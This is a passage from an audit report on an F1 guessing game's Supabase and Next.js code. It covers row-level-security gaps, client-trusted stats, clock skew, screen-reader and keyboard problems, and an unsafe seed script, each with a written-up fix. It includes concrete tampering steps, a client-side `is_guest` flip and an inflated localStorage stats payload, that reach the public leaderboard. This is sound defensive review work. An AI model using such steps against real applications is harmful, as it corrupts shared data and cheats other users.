**Cost, since speed was the constraint:** one small `UPDATE` per player per 5s while a match is on
screen — ~50 over a full ~4-minute match — on no path a player waits for. It stops by itself once
the RPC reports the match terminal, so nobody heartbeats through a results screen. Deliberately
**not** folded into `duel_submit_guess`: that's the hot path every other decision in this codebase
protects, and a `duel_matches` write there would sit behind a row lock `duel_close_round` also
takes.

One client change the fix forced, worth recording because it was a latent bug of its own: the
disconnect-grace timer was a `setTimeout` that fired **once**. With the server now able to say no,
a single refusal would have stranded the surviving player in a dead match — and the effect's deps
(`phase`, `channel.connected`, `channel.opponentConnected`) don't change while someone is absent, so
nothing re-armed it. It's a `setInterval` now. This also matters at the boundary: a player who dies
the instant after beating is stale by a hair *less* than the window when the first attempt lands, so
the first call legitimately gets refused and the retry 10s later succeeds.

**Not closed by this:** §3.4. A forged `match_end` broadcast over the unauthenticated
`duel:{matchId}` channel is a different route to a similar lie, and needs `private: true` plus
`realtime.messages` RLS. Independent change, independent finding.

### 3.6 `profiles_update_own` is a table-wide write policy — MED — ✅ FIXED (2026-07-29)

> **Fixed in [drizzle/0045](../drizzle/0045_profiles_column_grants.sql).** Confirmed as written and
> closed at the level the finding is really about — the column, not the row. Both halves: the
> privileged columns, and the unvalidated strings. See "Resolution" at the end of this section.

[0006:110-113](../drizzle/0006_auth_trigger_rls.sql#L110-L113) + [:133](../drizzle/0006_auth_trigger_rls.sql#L133)

```sql
CREATE POLICY "profiles_update_own" ON public.profiles
  FOR UPDATE TO authenticated USING (auth.uid() = id) WITH CHECK (auth.uid() = id);
GRANT SELECT, UPDATE ON public.profiles TO authenticated;
```

No column restriction. `supabase.from("profiles").update({ is_guest: false }).eq("id", myId)`
puts a throwaway anonymous account onto the leaderboard, which filters on `is_guest = false`
([0009:25](../drizzle/0009_leaderboard_view.sql#L25),
[0037:62](../drizzle/0037_streak_gap_reset.sql#L62)). The `handle_user_updated` trigger only
re-syncs when `auth.users.is_anonymous` changes, so a manual flip is never corrected.
Combined with 3.7, that's a fabricated top-of-board entry from a session that never played.

`display_name`/`username` are also unvalidated server-side — the `maxLength={32}` at
[ProfileSection.tsx:225](../components/settings/ProfileSection.tsx#L225) is client-only. React
escaping means no XSS, but unbounded strings and display-name impersonation are open.

This is the same class of hole that `user_stats_update_own` was correctly dropped for in
0008 — the fix pattern already exists in the repo; it just wasn't applied here.

#### Resolution (2026-07-29)

The 0008 pattern the finding points at — *drop the policy* — is the right fix when nothing
legitimate writes the table. Here something does: Settings → Profile edits `display_name`
(`ProfileSection`) and `avatar_url` (`AvatarPicker`), and only those two, verified by grepping
every `.from("profiles").update(...)` in the repo. So the policy stays and the **grant** narrows.

**RLS could not have fixed this, and that is the load-bearing point.** A policy's `USING` sees the
old row and its `WITH CHECK` sees the new one; nothing in a policy can compare the two, so "this
column may not change" is not something a policy can say at all. The row filter was always right
and always complete. The column filter was missing, and Postgres spells it as a column-level
`GRANT`:

```sql
REVOKE UPDATE ON public.profiles FROM authenticated;
GRANT  UPDATE (display_name, avatar_url) ON public.profiles TO authenticated;
```

`id`, `username`, `is_guest` and `created_at` become server-owned like every other table's
columns. The signup triggers are `SECURITY DEFINER` and run as the owner, so `handle_new_user` and
`handle_user_updated` are unaffected — a genuine upgrade still flips `is_guest`; a hand-written one
no longer can.

**The second half of the finding is fixed too.** `display_name` and `avatar_url` had no
server-side bound of any kind — `maxLength={32}` is on the input, and PostgREST is reachable
without ever loading it. Both now carry `CHECK` constraints (length, `btrim`-equality so a padded
lookalike handle is rejected rather than silently accepted, and no control characters, which is
what a newline in a leaderboard row is). Existing rows are sanitised in the same migration so the
constraints could be added **validated** rather than `NOT VALID` — a constraint that has never been
checked is a constraint nobody can rely on.

**Three things this turned up that the finding didn't say:**

1. **A column grant is invisible to `information_schema.role_table_grants`.** After this change
   `profiles` reports no client write at all there, while Settings writes to it every day. The
   grant-policy suite would have gone quietly, permanently blind — so
   [schemaGrants.test.ts](../lib/db/schemaGrants.test.ts) gained a third surface,
   `COLUMN_GRANT_POLICY`, read off `pg_attribute.attacl` (not `column_privileges`, which folds

### 3.7 `migrateLocalStats` trusts unbounded client numbers and can be replayed — HIGH — ✅ FIXED (2026-07-28)

> **Fixed in [drizzle/0041](../drizzle/0041_local_stats_merge_once.sql) +
> [lib/stats/localStatsMerge.ts](../lib/stats/localStatsMerge.ts).** All three sub-problems.
> Kept rather than sunset — see "Resolution" at the end of this section for why, and for the
> one place the suggested fix had to be changed.

[actions.ts:49-77](../lib/stats/actions.ts#L49-L77) + [store.ts:31-40](../lib/stats/store.ts#L31-L40)

`readStats()` does `{ ...base, ...parsed }` on arbitrary `localStorage` JSON with no range,
type, or sanity validation (only `guessDistribution.length` is checked). That object is
handed straight to the `migrateLocalStats` Server Action, which does:

```ts
gamesPlayed: current.gamesPlayed + local.gamesPlayed,
wins:        current.wins + local.gamesWon,
maxStreak:   Math.max(current.maxStreak, local.maxStreak),
```

Three separate problems:

1. **No validation.** Any number, including negative, non-integer, or `1e9`.
2. **No idempotency guard.** Server Actions are ordinary HTTP endpoints. The action can be
   called in a loop; each call *adds* again. The "once" protection is client-side only — the
   comment at [:384-392](../components/auth/AuthProvider.tsx#L384-L392) reasons about the
   `readStats()` self-clearing guard, which an attacker simply doesn't run.
3. **No `is_guest` check.** It only resolves `getCurrentUserId()` — any authenticated user,
   at any time, not just during a genuine guest upgrade.

**Exploit:** set `localStorage['f1dw:stats']` to `{gamesPlayed:99999, gamesWon:99999,
maxStreak:9999, ...}`, sign up. `maxStreak` is a **public leaderboard column** —
[actions.ts:76](../lib/leaderboard/actions.ts#L76) selects it into `StreakLeaderboardEntry`.
So this reaches the public board.

Worth noting the *design* is already right where it matters: `currentStreak` is only adopted
when the server row has no history, and is deliberately left unanchored so
`currentStreakAsOf` decays it to 0 ([actions.ts:41-48](../lib/stats/actions.ts#L41-L48)) — the
ranking column is protected. It's `maxStreak` / `gamesPlayed` / `wins` that aren't.

**Fix:** clamp each field to a sane bound, require `profile.is_guest === false` *and* a
one-shot marker (a `stats_migrated_at` column on `profiles`, or a row in a
`stats_migrations` table) so a replay is a no-op — same pattern `daily_results` already uses
for `recordDailyResult`. Also consider: nothing writes `f1dw:stats` any more (`writeStats` is
only called by `resetStats`), so this is a legacy-only path whose remaining value is small
relative to its attack surface — sunsetting it entirely is a legitimate option.

#### Resolution (2026-07-28)

**Kept, not sunset.** Deleting it would silently drop the pre-accounts history of every genuine
legacy player who hasn't upgraded yet, and that's a product decision this patch shouldn't make on
its own. All three sub-problems are closed instead. This is also the one action of the three that
*must* take client data — pre-accounts stats exist nowhere but the player's browser — which is
precisely why it needs all three defences rather than any one of them.

1. **Validated**, in a pure, unit-tested `sanitizeLocalStats`
   ([localStatsMerge.ts](../lib/stats/localStatsMerge.ts), 15 cases). It **rejects rather than
   clamps**: honest data satisfies every rule by construction, so clamping would only ever alter
   dishonest data — and clamping dishonest data still imports the clamped maximum, which on a
   leaderboard column is the whole problem. The bound on `gamesPlayed` isn't a hand-picked round
   number but `getDailyPuzzleNumber(today)` — *you cannot have played more dailies than there have
   been days*, the only externally-anchored bound available and a far tighter one. On top of that,
   four internal-consistency rules that real data can't violate: wins ≤ played, max streak ≤ wins
   (a streak is consecutive *wins*), current ≤ max, and Σ`guessDistribution` ≤ wins. The finding's
   own payload (`gamesPlayed: 99999, maxStreak: 9999`) is pinned by value as a test case.
2. **Once, server-side.** `user_stats.local_stats_merged_at`, read and set under a
   `SELECT … FOR UPDATE` on the stats row — the bare null-check alone would be the same
   check-then-act race `applyMatchResult` takes a lock for.
3. **Full accounts only.** `profiles.is_guest` is read in the same transaction, not inferred from
   the caller being in an upgrade flow (a client-side notion).

**The one change to the suggested fix — and it matters.** The finding offers "`stats_migrated_at`
on `profiles`, or a row in a `stats_migrations` table". `profiles` is the wrong table, because of
this audit's own §3.6: `profiles_update_own` is a table-wide client UPDATE policy, so a marker
stored there could be set back to `NULL` from a devtools console — handing the merge back once per
clear, forever. A marker the client can clear is not a marker. It lives on `user_stats`, which has
no client write policy at all.

That reasoning is what turned up **[drizzle/0042](../drizzle/0042_server_authoritative_table_grants.sql)**:
"no write policy" was true, but *every* table still carried the full `INSERT/UPDATE/DELETE` grant to
both `anon` and `authenticated`. See the addendum under §3.11.

**No backfill, deliberately.** Existing rows keep a `NULL` marker, so an account that already merged
can merge once more. There's no record of which rows have merged, so a blanket backfill would
permanently deny the merge to every genuine legacy player who hasn't upgraded yet — to remove one
already-possible replay from accounts that could equally have done it yesterday. Bounding future
replays at one, with every field now validated, is the actual fix. `resetUserStats` deliberately
does **not** clear the marker either: "this account has spent its one legacy merge" stays true after
a stats reset.

**Speed:** untouched. This runs once in an account's lifetime, on the guest→account upgrade, off
every render and every game path.

### 3.10 UTC-midnight split-brain across three clocks — MED — ✅ FIXED (2026-07-28)

> **Closed by §3.2's fix, exactly as this section predicted.** `recordDailyResult` no longer
> calls `todayUtcDateString()` on the Next.js server; it reads the date off the `daily_progress`
> row, selected with `(now() AT TIME ZONE 'UTC')::date` evaluated *in Postgres* — the same clock
> that stamped it. Two of the three clocks are now one, and the write side is no longer skewable.
> The third (the browser, in `AuthProvider.toUserStats`) is display-only and already documented
> as such. The straddle case the `<= 1` read tolerance was papering over is handled directly:
> the write looks back two UTC days for the newest *completed* board, so a 23:59:59Z finish
> recorded at 00:00:01Z still lands on the day it was played.

The day is resolved from three different clocks: `daily_submit_guess` uses Postgres `now()`
([0031:146](../drizzle/0031_daily_rpc_record_fix.sql#L146)); `recordDailyResult` uses the
**Next.js server** clock ([actions.ts:32](../lib/stats/actions.ts#L32) → `todayUtcDateString()`);
the client cache key uses the **browser** clock
([DailyGame.tsx:34-44](../app/%28game%29/daily/DailyGame.tsx#L34-L44)).

Any skew between Vercel and Supabase — or a request straddling 00:00 Z — writes
`daily_progress` under date D while `daily_results` / `last_daily_date` land on D±1. Then
`nextCurrentStreak`'s `daysBetween(...) === 1` rule
([streak.ts:52](../lib/stats/streak.ts#L52)) sees a 0- or 2-day gap and silently resets a live
streak. The `<= 1` tolerance in `currentStreakAsOf` ([:68](../lib/stats/streak.ts#L68)) was
added for exactly this class of problem but only protects *reads*, not writes. Fixing 3.2
(deriving the result server-side inside the same transaction) closes this too.

- **`applyMatchRatings` cannot be double-applied or called by a non-participant** — and it
  uses a real lock, not check-then-act: `SELECT … FOR UPDATE` on the match row followed by a
  `rating_delta_a IS NOT NULL` short-circuit ([actions.ts:500-507](../lib/duel/actions.ts#L500-L507)).
- **`match_or_queue` derives the caller's rating server-side** rather than trusting a client
  value, and puts all three integrity predicates **inside** the claiming
  `FOR UPDATE … SKIP LOCKED` ([0032:254-265](../drizzle/0032_duel_matchmaking_integrity.sql#L254-L265))
  — never a read-then-check race.
- **Migration 0034 is genuinely good work**, and the re-REVOKE after each later redefinition
  of `duel_begin_round` (0035, 0036) shows the author understood that `CREATE OR REPLACE`
  interacts with grants. The gap is that the same reasoning wasn't extended to the daily
  functions.
- **No division-by-zero anywhere.** `tugFill`'s operands always include `DUEL_BASELINE`;

  `closeness` ranges are non-zero constants in both TS and SQL.
- **The daily localStorage cache genuinely cannot be used to replay the day** — editing or
  deleting it changes nothing, because the server re-derives everything from
  `daily_progress`. That part of the design works exactly as documented.
- `f1dw:infinite:poolWindow` is re-validated through `isPoolWindow`
  ([poolWindow.ts:8](../lib/settings/poolWindow.ts#L8)) *and* against a SQL allowlist, so
  tampering can't inject an arbitrary window. `f1dw:settings` carries no server trust at all.

### 4.1 The game is unplayable with a screen reader — HIGH (a11y) — ✅ FIXED (2026-07-28)

> **Fixed in [lib/game/tileLabel.ts](../lib/game/tileLabel.ts) (new, pure, unit-tested) +

> covers 4.7's `DriverCodeBadge` bullet — the "VER" in this finding's own example.

[GuessGrid.tsx:47-72](../components/game/GuessGrid.tsx#L47-L72)

The `Tile` has **no `aria-label`**, the closeness wash is `aria-hidden="true"`
([:57](../components/game/GuessGrid.tsx#L57)), and the ↑/↓ arrow is `aria-hidden="true"`
([:65](../components/game/GuessGrid.tsx#L65)). A screen reader therefore announces a guess row
as: `VER` `Dutch` `Red Bull` `28` `2015` `65` — the driver's own data, with **zero**
indication of exact/miss/historical/higher/lower. Every bit of feedback is conveyed by
colour, opacity, and a hidden glyph.

That's WCAG 1.4.1 (Use of Color) and 1.1.1 (Non-text Content). Fix is small: an
`aria-label` per tile, e.g. `` `Team: Red Bull, previously raced for them` `` /
`` `Age: 28, target is older` ``. The colorblind mode
([globals.css:124-133](../app/globals.css#L124-L133)) is thoughtfully done for *sighted*
colour-vision deficiency, but it doesn't help here at all.

#### Resolution (2026-07-28) — 4.1, and 4.7's `DriverCodeBadge` bullet

The label is **`role="img"` + `aria-label`, not a bare `aria-label`.** That's the load-bearing
detail the finding's one-line fix would have missed: `aria-label` on a plain `<div>` names an
element with no role, which ARIA leaves to the implementation and screen readers routinely ignore.
`role="img"` also makes the tile **atomic** — the label is announced and the contents are skipped —
which is what stops the value being said twice, and is why turning on "Show flags" no longer *loses*
the nationality (the flag's own `"Netherlands flag"` label is inside the tile and now yields to the
label that says the verdict too).

**The wording lives in `lib/game/tileLabel.ts`, beside the rules it speaks.** It is the spoken half
of `compare.ts`, so it is pure and unit-tested like the rest of `lib/game` rather than inlined per
component, where the daily board, the duel board and the intermission reveal would each grow their
own phrasing. `guessTileLabels(driver, result)` is the single place the column ↔ `GuessResult`
field pairing is written down, and it returns a map **keyed by column, not a positional array**, so
no caller can hang the age label off the debut-year tile. Three things the finding's example
phrasing didn't reach:

- **"higher" is about the target, and the word "higher" is useless on its own.** `compare.ts`
  defines it as *the target's* value being higher, so each column says what that means in its own
  terms — "The target is older" / "The target debuted later" / "The target has more wins" — never
  "higher", which a listener has to hold against the guess to interpret.
- **The closeness wash is feedback too, and it was `aria-hidden` with nothing in its place.** It is
  now three named bands appended to the ordered verdict (`, very close` / `, close` / `, far off`).
  They sit high (0.6 / 0.25) because `compare.ts` squares the falloff: 0.25 is already *half* the
  attribute's range away, which is not "close".
- **`—` is not a value.** A driver with no constructor on record renders an em dash, which is read
  as "dash" or dropped; the label says "no team on record", and the verdict stays a miss because
  an absent team genuinely is one.

**Tiles that are already explained in prose keep their contents readable** — `label` is optional,
and the marketing legend and worked example ([HowToPlay.tsx:127](../components/marketing/HowToPlay.tsx#L127))
pass none, since a `role="img"` label there would duplicate the visible caption that already spells
the rule out. The duel intermission's reveal row gets `tileValueLabel` instead: column + value with
**no verdict**, because those tiles are the answer's stats rather than a comparison — and that row
is the one with no visible column headers (4.7's last-but-one bullet), so the column names now
exist for it in speech at least.

`DriverCodeBadge` (4.7) is the same fix: the rotated code is a visual shorthand for the driver, so
it takes `role="img"` and announces the **name** where the caller has one (`GuessRow`), falling back
to "Driver code VER" where the name is already said in adjacent prose (`ResultCard`, the reveal).
The row this finding opens with now reads: *"Max Verstappen. Nationality: Netherlands, correct. Team:
Toro Rosso, not the target's current team, but they raced for it in the past. Age: 28, the target is
older, very close."* — instead of `VER Dutch Red Bull 28 2015 65`.

**Still outstanding:** submitting a guess still announces nothing — there is no live region for the
new row, so a screen-reader user has to navigate back into the grid to find out what happened. The
tiles are readable now; the *event* isn't announced.

### 4.2 Accented driver names can't be found by typing the unaccented spelling — HIGH — ✅ FIXED (2026-07-28)

> **Fixed in [fuzzyMatch.ts](../lib/game/fuzzyMatch.ts) + [DriverAutocomplete.tsx](../components/game/DriverAutocomplete.tsx),

[fuzzyMatch.ts:37-42](../lib/game/fuzzyMatch.ts#L37-L42) lowercases but never normalizes

Traced by hand:
- `"hulkenberg"` vs `"nico hülkenberg"` — the substring test fails (`ü ≠ u`), and the
  subsequence fallback then looks for a plain `u` after the `h` and never finds one →

- `"perez"` vs `"sergio pérez"` — same: after `p`, needs `e`, hits `é`, `r`; the later `e`

Also hits Räikkönen, Häkkinen, Gutiérrez, Frentzen (fine), Alesi (fine). For an F1 game this

add the Hülkenberg/Pérez/Räikkönen cases to `fuzzyMatch.test.ts`.

### 4.3 Two autocomplete failure modes give the user nothing — MED — ✅ FIXED (2026-07-28)

> **Fixed in [DriverAutocomplete.tsx](../components/game/DriverAutocomplete.tsx).** Finding
> confirmed as written. See the shared "Resolution" below.

[DriverAutocomplete.tsx:100](../components/game/DriverAutocomplete.tsx#L100) renders the
listbox only when `isOpen && matches.length > 0`, and
[:55-59](../components/game/DriverAutocomplete.tsx#L55-L59) makes Enter a no-op unless
`matches[activeIndex]` exists.

So on an unknown or unmatched name (including every case in **4.2**): the dropdown silently
disappears, Enter does nothing, and there is **no "no drivers found" message**. The user
can't tell whether the driver is out of the pool, misspelled, or the app is broken.

Add an empty state in the listbox (`No drivers match "…"`) plus an `aria-live` announcement.

#### Resolution (2026-07-28) — 4.2 + 4.3, and the per-keystroke half of 1.3

Both confirmed as written and fixed in one change, because they are the same bug seen from two
ends: the fold is what makes "perez" find someone, and the empty state is what the user gets on
the queries where nothing legitimately matches. Fixing only 4.2 would have left every genuine
miss silent; fixing only 4.3 would have shipped a polished "no driver matches Perez".

**The fold is a precomputation, not an extra pass.** `normalizeSearchText` lowercases,
NFD-decomposes, and drops the combining marks — and the search compares *folded key against
folded query*, so both the accented and the unaccented spelling work. Doing that inside the scan
would have made the accent fix a slowdown, so `buildSearchIndex` runs it once per pool into a
`{ item, key }[]` that `DriverAutocomplete` holds in a `useMemo` on `drivers` (a stable reference
in all three modes — a server prop in daily/duel, memoized on the pool window in Infinite). The
old code's `getText(item).toLowerCase()` was inside the loop, allocating a string per driver per
keypress; that allocation is gone entirely, which is 1.3's first half.

Two details the finding didn't reach:

- **NFD alone does not fold every Latin letter, and this roster proves it.** `ø` is a single
  codepoint, not `o` + a mark, so it survives decomposition untouched — and **Tom Belsø** is on
  the roster. A small `NON_DECOMPOSING` map handles it and its near neighbours (`æ œ đ ð ł ß þ`).
  Checked rather than assumed, by folding every real name in the database: **792 drivers, 55 with
  non-ASCII characters, 0 left non-ASCII after the fold** (chars present: `Á É Ó á ä ç è é í ó ô ö
  ø ú ü š`). Four are in the 10-year pool daily and duel draw from — Gutiérrez, Räikkönen,
  Hülkenberg, Pérez — so this was live on the modes everyone plays, not a legacy-pool curiosity.
- **`\p{Diacritic}` — the fix the finding suggests — does not compile here.** Unicode property
  escapes are ES2018 and `tsconfig.json` targets ES2017, so `tsc` rejects the regex. The explicit
  `̀-ͯ` range is equivalent for Latin decompositions and has no target requirement.

**The empty state keeps the listbox mounted.** The panel now renders whenever the query is
non-empty, with the `role="listbox"` element always present (it is what `aria-controls` names,
empty or not) and the message beside it rather than inside it, so the listbox never contains a
non-option child. The announcement is a **persistent** `role="status"` region holding a constant
"No drivers found." — a live region announces its *changes*, and one that mounts already populated
is routinely missed; a constant string also means it is announced once when the state begins
rather than re-read on every further keystroke that also finds nothing. Arrow keys are now guarded
on an empty match list, which the finding didn't call out: `matches.length - 1` is `-1` with no
results, so ArrowDown parked `activeIndex` on an option that doesn't exist.

**Measured, because the fold could have made the hot path dearer** (800-driver legacy pool, old
implementation vs new, per keystroke over a realistic typing sequence): **117.3 µs → 94.1 µs,
1.25× faster**, with the once-per-pool index build costing 431 µs. The second half of 1.3 is in
there too — the full `sort()` of every match to then take 8 is replaced by a bounded top-8
insertion, stable in the same way `Array.sort` is, so equal scores still keep pool (alphabetical)
order. `fuzzyMatch.test.ts` pins that ordering property explicitly, alongside the
Hülkenberg/Pérez/Räikkönen/Häkkinen/Gutiérrez/Belsø cases and the reverse direction (typing the
accented spelling still works).

**Still outstanding from 1.3:** nothing in the filter itself; what remains of that finding is
whether the other per-keystroke work in the tree (1.1's context re-renders) now dominates it.

### 4.5 `PoolSelect` is completely unusable by keyboard — HIGH (a11y) — ✅ FIXED (2026-07-28)

> **Fixed in [PoolSelect.tsx](../components/game/PoolSelect.tsx).** Finding confirmed as
> written. See "Resolution" at the end of this section.

[PoolSelect.tsx](../components/game/PoolSelect.tsx) sets `role="combobox"` ([:53](../components/game/PoolSelect.tsx#L53)),
`role="listbox"` ([:86](../components/game/PoolSelect.tsx#L86)) and `role="option"`
([:94](../components/game/PoolSelect.tsx#L94)) — and then implements **no `onKeyDown`, no
`tabIndex`, and no `aria-activedescendant`** (verified: those three greps return nothing).

A keyboard user can focus the trigger and press Enter to open it, and then **cannot select
any of the five pool windows**. The only way out is Escape. That's a total keyboard block on
Infinite mode's primary difficulty control — and unlike 4.1, this isn't a degraded
experience, it's an unreachable feature.

Worth contrasting with `DriverAutocomplete`, which implements the same pattern correctly
(4.6). The knowledge is in the codebase; it just wasn't applied here.

#### Resolution (2026-07-28)

Confirmed as written — all three greps returned nothing — and fixed by finishing the ARIA 1.2
combobox pattern the roles were already promising. DOM focus never leaves the trigger,
`activeIndex` is the keyboard cursor, `aria-activedescendant` on the trigger is what names the
row that cursor is on, and the options stay deliberately **non-focusable**. Moving real focus
into the list is the other valid pattern; half of each is what produces a listbox you can open
and not use, which is what this was. Keys: ArrowUp/ArrowDown (open at the *current* selection
when closed, move when open), Home/End, Enter/Space (open, then select), Escape, and Tab —
which closes the panel without swallowing the tab, so focus can leave without orphaning it
open.

Two details the finding didn't reach, both of which mean `DriverAutocomplete` couldn't just be
copied across:

- **`preventDefault` on Enter/Space is load-bearing here and is a no-op there.** The reference
  implementation's trigger is an `<input>`, where those keys do nothing by default.
  `PoolSelect`'s is a `<button>`, and a browser *synthesizes a click* from Enter and Space on
  one — which lands on the same `onClick` that toggles the panel. Without the
  `preventDefault`, selecting with Enter would immediately reopen the list it just closed, and
  opening with Space would close it in the same keystroke. The comment in the handler says so,
  because it reads like a stray defensive call otherwise.
- **The fix destroys focus by succeeding.** Choosing a pool restarts the round, and
  [InfiniteGame](../app/%28game%29/infinite/InfiniteGame.tsx#L164-L169) disables the trigger while
  that loads — deliberately, per its own comment. A browser blurs an element the instant it
  becomes disabled, so focus drops to `<body>` and Tab restarts from the top of the page: the
  control would have been usable exactly once before losing the user their place. The trigger
  now takes focus back when it returns, armed **only** by the keyboard select path and only if
  `document.activeElement` is still `<body>` — so a mouse click doesn't yank a focus ring onto
  it, and nothing is stolen from wherever the user has since moved.

**Visually, mouse behaviour is unchanged** except that opening the panel now shows the cursor on
the current selection. The active row is marked with `ring-2 ring-inset ring-accent` — the same
`focus:ring-2 focus:ring-accent` the rest of the site uses, which is the accurate reading, since
that row is where focus effectively is. Inset because the panel is `overflow-hidden` and would
clip an outset ring on the first and last rows; and selection keeps the `bg-accent-weak` fill it
always had, so the two states stay legible on the row where they coincide. Hover deliberately
does *not* move `activeIndex` (the sibling component syncs them), which keeps the accent off a
row just because a pointer passed over it.

The pre-existing document-level Escape listener was **kept** rather than folded into the new
`onKeyDown`, with a comment saying why: Safari doesn't focus a `<button>` when you click it, so
a mouse-opened panel there can be open with focus still on `<body>`, where a handler bound to
the trigger never fires.

**Scoped out, and worth knowing:** [InfoTopBar](../components/layout/InfoTopBar.tsx#L83-L132)'s
sub-`sm` nav dropdown copies this component's styling *and* its `combobox`/`listbox`/`option`
markup, and has no key handlers either. It is not the same finding — its options are `<Link>`s,
so they're genuinely tabbable and the menu is operable — but its ARIA roles now describe a
keyboard interaction it doesn't implement. That's a separate (lower) item, not a silent gap.

**Verification:** `npm run typecheck` clean; `npm test` green (146 passed, 91 skipped — the DB
tier). No automated coverage was added: there is no jsdom or testing-library in the repo (every
suite is pure-logic or DB integration), and pulling one in to cover one component is its own
change. The audit's own test for this — unplug the mouse, tab to the selector, change the pool
— is manual and was **not** run in a browser here.

### 4.6 Infinite mode can dead-end on a permanent loading screen — MED — ✅ FIXED (2026-07-28)

> **Fixed in [InfiniteGame.tsx](../app/%28game%29/infinite/InfiniteGame.tsx) and
> [infiniteRoundPrefetch.ts](../lib/game/infiniteRoundPrefetch.ts).** Finding confirmed as
> written. See "Resolution" at the end of this section.

[InfiniteGame.tsx:63-77](../app/%28game%29/infinite/InfiniteGame.tsx#L63-L77):

```ts
startTransition(async () => {
  try {
    await (existing ?? startInfiniteRound(window));
    setStatus("playing");
  } finally {
    startingRef.current = false;
  }
});
```

`try`/`finally` with **no `catch`**. `startInfiniteRound` throws on RPC failure, so if
starting a round fails — offline, RPC error — `setStatus("playing")` never runs and the UI is
stuck on the loading overlay **forever**, with no error and no retry. Compare the daily
board's hydrate path ([DailyGame.tsx:179-192](../app/%28game%29/daily/DailyGame.tsx#L179-L192)),
which handles exactly this case well with a cache fallback plus an explicit error + Retry.
Same fix shape, one mode over.

#### Resolution (2026-07-28)

Confirmed as written, and fixed as the finding suggested — with one correction and one addition.

**The correction: only half of daily's shape transfers.** Daily's `catch` tries a cached board
first and falls through to error + Retry; infinite has nothing to cache. A daily board is a list
of guesses the client can meaningfully re-render from a snapshot, but an infinite *round* is a
row the server has to create — until `infinite_start_round` returns there is no target, and a
board rendered from a local guess would be unplayable in a way that only shows up on the first
guess ("Your round expired"). So the fallback branch is deliberately absent: the failure goes
straight to error + Retry.

`RoundStatus` gained `"error"` — the `catch` needed a state to fail *into*, which is why this
wasn't the one-liner the summary called it. The error block **replaces the play area** rather
than sitting above it, matching daily: with no round, the pool selector, the input and the six
empty rows are all controls that can't do anything. `isLoading` is `status === "loading"` alone,
so the overlay and `aria-busy` clear themselves on the way into the error state, and the header's
"New driver" button (`disabled={isLoading}`) becomes live again — it is a second, equivalent
retry, but not a discoverable one, which is what the explicit Retry is for.

**The addition the finding didn't reach: the prefetch is the other half of the same failure.**
`beginRound`'s `existing` argument comes from
[infiniteRoundPrefetch.ts](../lib/game/infiniteRoundPrefetch.ts), which fires
`startInfiniteRound` on **hover or focus** of the Infinite tab and stores the promise. Nothing
attached a handler to it, so a failed prefetch was two bugs at once:

- An **unhandled rejection from a mouseover.** The promise may never be awaited by anyone — the
  user doesn't navigate, or navigates with a different pool window, in which case
  `consumeInfiniteRoundPrefetch` discards the entry unread.
- A **cached failure.** `prefetchInfiniteRound` early-returns when an entry for the same window
  already exists, so one rejected promise was handed out forever; a mount arriving after the
  network recovered still failed instantly on the stale result. That turns a transient blip into
  a sticky one, which is the same class of dead-end as the missing `catch`.

Both are closed by one `void entry.promise.catch(...)` that clears the entry if it's still the
current one. The `catch` is attached to a **derived** promise while the *original* stays stored,
which is load-bearing: swallowing the rejection on the stored promise would mark it handled and
then hand `beginRound` a resolved promise for a round that was never created, so the component
would set `"playing"` and the failure would resurface as a confusing error on the first guess.
The consumer must still see the rejection.

**Verification:** `npm run typecheck` clean; `npm test` green (167 passed, 100 skipped — the DB
tier). No automated coverage added, for the same two reasons as §4.5: there is no jsdom or
testing-library in the repo, and the prefetch module's only branch worth testing runs through the
Supabase browser client, which would need the repo's first `vi.mock` (there is currently none —
every suite is pure-logic or DB integration). The manual check — throttle to offline, load
`/infinite`, confirm the error + Retry appears and that Retry recovers once back online — was
**not** run in a browser here.

## 5. Maintainability & F1 Data Management

### 5.1 `npm run db:seed` will fail in production, and would corrupt ids if it didn't — CRITICAL — ✅ FIXED (2026-07-28)

> Finding confirmed exactly as written, and **understated**: `drivers` turned out not to be
> write-protected from the browser at all, so the seed script was not the only way F1 data
> gets in. See "Resolution" at the end of this section.

[seed.ts:168-174](../scripts/seed.ts#L168-L174)

```ts
console.log("Clearing existing drivers table ...");
await db.delete(drivers);          // DELETE FROM drivers — no WHERE, no transaction

for (let i = 0; i < values.length; i += INSERT_BATCH_SIZE) {
  await db.insert(drivers).values(values.slice(i, i + INSERT_BATCH_SIZE));
}
```

`drivers.id` is `serial` ([schema.ts:5](../lib/db/schema.ts#L5)) and four tables hold FKs to it,
all `ON DELETE no action`:

| Table | Migration |
|---|---|
| `duel_rounds.driver_id` | [0011:48](../drizzle/0011_duel_realtime_schema.sql#L48) |
| `infinite_rounds.driver_id` | [0027:10](../drizzle/0027_infinite_rounds_table.sql#L10) |
| `daily_targets.driver_id` | [0030:25](../drizzle/0030_daily_state_rpc.sql#L25) |
| `daily_progress.guesses` | `integer[]` — no FK, so **silently** orphaned |

Three consequences, in order of when you'd hit them:

1. **It throws.** `DELETE FROM drivers` raises a foreign-key violation as soon as a single
   `daily_targets` row exists — which is after the first daily play of any day. So the
   documented "re-run the seed after a race weekend" update path is already broken against a
   live database.
2. **If you force past it** (cascade/truncate), `serial` restarts and **every stored driver
   id now points at a different driver**: past `daily_progress.guesses` render the wrong
   names, and `daily_targets` silently rewrites which driver each historical day was.
3. **It isn't transactional.** A failure in the middle of the batch loop leaves the table
   empty or partial — the game is down, and `daily_state()` starts throwing "No drivers
   found for pool window".

**Fix:** make it an idempotent upsert keyed on a stable natural key. F1DB's `f1db-drivers.csv`
`row.id` is exactly that (it's already used as the aggregate map key at
[seed.ts:59](../scripts/seed.ts#L59) and [:123](../scripts/seed.ts#L123)) but is currently
**discarded** rather than stored. Add a `f1db_id text unique` column, then
`INSERT ... ON CONFLICT (f1db_id) DO UPDATE SET career_wins = ..., last_team = ...,
previous_teams = ..., last_active_year = ...`, wrapped in a single `db.transaction`. That
makes a weekly re-seed safe, preserves ids, and is the precondition for the Jolpica cron
CLAUDE.md still lists as unbuilt.

#### Resolution (2026-07-28) — [drizzle/0043](../drizzle/0043_drivers_seed_integrity.sql)

Built as specified: `f1db_id text` + `UNIQUE`, an `ON CONFLICT (f1db_id) DO UPDATE` upsert, one
transaction, nothing ever deleted. **All three consequences confirmed against the live database
first** — 792 drivers, and 4 `daily_targets` + 154 `duel_rounds` + 16 `infinite_rounds` rows
pointing at them, so the `DELETE` throws today, exactly as the finding says. The sequence sits at
997 against a `max(id)` of 792, which is the fingerprint of a delete-and-reinsert cycle having
already happened once.

**The finding is understated, and the part it missed is worse than the part it found.** §5.1 opens
"it's the only way F1 data enters the app." It is not. `drivers` was created by drizzle/0000 as a
plain table and never given a grant decision *or* RLS — unlike the nine tables
